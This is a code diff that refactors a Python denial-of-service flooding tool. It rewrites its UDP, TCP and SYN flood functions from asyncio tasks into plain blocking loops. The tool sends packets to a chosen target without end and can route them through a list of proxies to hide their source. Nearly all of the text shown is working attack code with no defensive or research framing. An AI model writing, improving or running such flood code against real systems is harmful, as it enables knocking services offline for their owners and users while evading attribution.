@@ -1,4 +1,3 @@
-import asyncio
 import os
 import random
 import socket
@@ -42,8 +41,7 @@ def get_socket_with_proxy():
     if len(parts) == 4:
         ip, port, username, password = parts
         sock = socks.socksocket()
-        sock.set_proxy(proxy_type, ip, int(port),
-                       username=username, password=password)
+        sock.set_proxy(proxy_type, ip, int(port), username=username, password=password)
     else:
         ip, port = parts
         sock = socks.socksocket()
@@ -52,88 +50,64 @@ def get_socket_with_proxy():
 
 
 def udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
-    async def udp_task():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = generate_payload(packet_size, payload_mode)
-        sent = 0
-        delay = 0
-        while True:
-            try:
-                await asyncio.to_thread(sock.sendto, payload, (target_ip, target_port))
-                sent += 1
-                if sent % 10000 == 0:
-                    print(
-                        f"{CYAN}[{timestamp()}][UDP-{thread_id}] Packets: {sent}{RESET}"
-                    )
-            except Exception as e:
-                print(f"{RED}[UDP-{thread_id}] Error: {e}{RESET}")
-                await asyncio.sleep(delay)
-                delay = min(0.1, delay + 0.001)
-
-    def run_loop():
-        asyncio.run(udp_task())
-
-    threading.Thread(target=run_loop, daemon=True).start()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    payload = generate_payload(packet_size, payload_mode)
+    sent = 0
+    delay = 0
+    while True:
+        try:
+            sock.sendto(payload, (target_ip, target_port))
+            sent += 1
+            if sent % 10000 == 0:
+                print(f"{CYAN}[{timestamp()}][UDP-{thread_id}] Packets: {sent}{RESET}")
+        except Exception as e:
+            print(f"{RED}[UDP-{thread_id}] Error: {e}{RESET}")
+            time.sleep(delay)
+            delay = min(0.1, delay + 0.001)
 
 
 def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
-    async def tcp_task():
-        payload = generate_payload(packet_size, payload_mode)
-        sent = 0
-        while True:
-            try:
-                sock = get_socket_with_proxy() if use_proxy else socket.socket()
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                sock.settimeout(2)
-                await asyncio.to_thread(sock.connect, (target_ip, target_port))
-                for _ in range(10):
-                    await asyncio.to_thread(sock.send, payload)
-                    sent += 1
-                    if sent % 1000 == 0:
-                        print(
-                            f"{YELLOW}[{timestamp()}][TCP-{thread_id}] Packets: {sent}{RESET}"
-                        )
-                sock.close()
-            except Exception as e:
-                print(f"{RED}[TCP-{thread_id}] Error: {e}{RESET}")
-                await asyncio.sleep(0.05)
-
-    def run_loop():
-        asyncio.run(tcp_task())
-
-    threading.Thread(target=run_loop, daemon=True).start()
+    payload = generate_payload(packet_size, payload_mode)
+    sent = 0
+    while True:
+        try:
+            sock = get_socket_with_proxy() if use_proxy else socket.socket()
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.settimeout(2)
+            sock.connect((target_ip, target_port))
+            for _ in range(10):
+                sock.send(payload)
+                sent += 1
+                if sent % 1000 == 0:
+                    print(
+                        f"{YELLOW}[{timestamp()}][TCP-{thread_id}] Packets: {sent}{RESET}"
+                    )
+            sock.close()
+        except Exception as e:
+            print(f"{RED}[TCP-{thread_id}] Error: {e}{RESET}")
+            time.sleep(0.05)
 
 
 def syn_flood(target_ip, target_port, thread_id):
-    async def syn_task():
-        sent = 0
-        while True:
-            try:
-                sock = (
-                    get_socket_with_proxy()
-                    if use_proxy
-                    else socket.socket(
-                        socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP
-                    )
-                )
-                packet = b"\x00" * 60
-                await asyncio.to_thread(sock.sendto, packet, (target_ip, target_port))
-                sent += 1
-                if sent % 100 == 0:
-                    print(
-                        f"{GREEN}[{timestamp()}][SYN-{thread_id}] Packets: {sent}{RESET}"
-                    )
-            except PermissionError:
-                print(f"{RED}[SYN-{thread_id}] Root required!{RESET}")
-                return
-            except Exception as e:
-                print(f"{RED}[SYN-{thread_id}] Error: {e}{RESET}")
-                await asyncio.sleep(0.1)
-
-    def run_loop():
-        asyncio.run(syn_task())
-
-    threading.Thread(target=run_loop, daemon=True).start()
+    sent = 0
+    while True:
+        try:
+            sock = (
+                get_socket_with_proxy()
+                if use_proxy
+                else socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            )
+            packet = b"\x00" * 60
+            sock.sendto(packet, (target_ip, target_port))
+            sent += 1
+            if sent % 100 == 0:
+                print(f"{GREEN}[{timestamp()}][SYN-{thread_id}] Packets: {sent}{RESET}")
+        except PermissionError:
+            print(f"{RED}[SYN-{thread_id}] Root required!{RESET}")
+            return
+        except Exception as e:
+            print(f"{RED}[SYN-{thread_id}] Error: {e}{RESET}")
+            time.sleep(0.1)
 
 
 def check_latency(ip, port):
@@ -157,8 +131,7 @@ def load_proxies():
                     proxies.append(line)
         use_proxy = len(proxies) > 0
         if use_proxy:
-            print(
-                f"{YELLOW}[!] Loaded {len(proxies)} proxies from proxies.txt{RESET}")
+            print(f"{YELLOW}[!] Loaded {len(proxies)} proxies from proxies.txt{RESET}")
 
 
 def main():
@@ -215,8 +188,7 @@ def main():
                 args=(target_ip, target_port, packet_size, i + 1, payload_mode),
             )
         elif protocol == "syn":
-            t = threading.Thread(target=syn_flood, args=(
-                target_ip, target_port, i + 1))
+            t = threading.Thread(target=syn_flood, args=(target_ip, target_port, i + 1))
         else:
             print(f"{RED}Invalid protocol{RESET}")
             sys.exit(1)
